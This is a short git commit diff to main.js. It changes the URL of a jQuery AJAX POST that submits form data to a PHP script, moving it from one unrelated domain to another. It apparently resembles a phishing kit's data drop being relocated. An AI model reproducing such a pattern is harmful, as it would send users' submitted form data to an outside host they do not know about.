af375d33d60027da7976b2ef382867eae603be4e
seltrica <payrealsys@gmail.com>
2024-06-02 20:24:55 +0300

    Update main.js

--- main.js
+++ main.js
@@ -69,7 +69,7 @@ $(document).ready(function() {
   
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://bucketlion.com/dddbb/joman.php",
+            url: "https://physicaleducationdiploma.com/dashboard/file/joman.php",
             type: 'POST',
             data: formData,
             contentType: false,
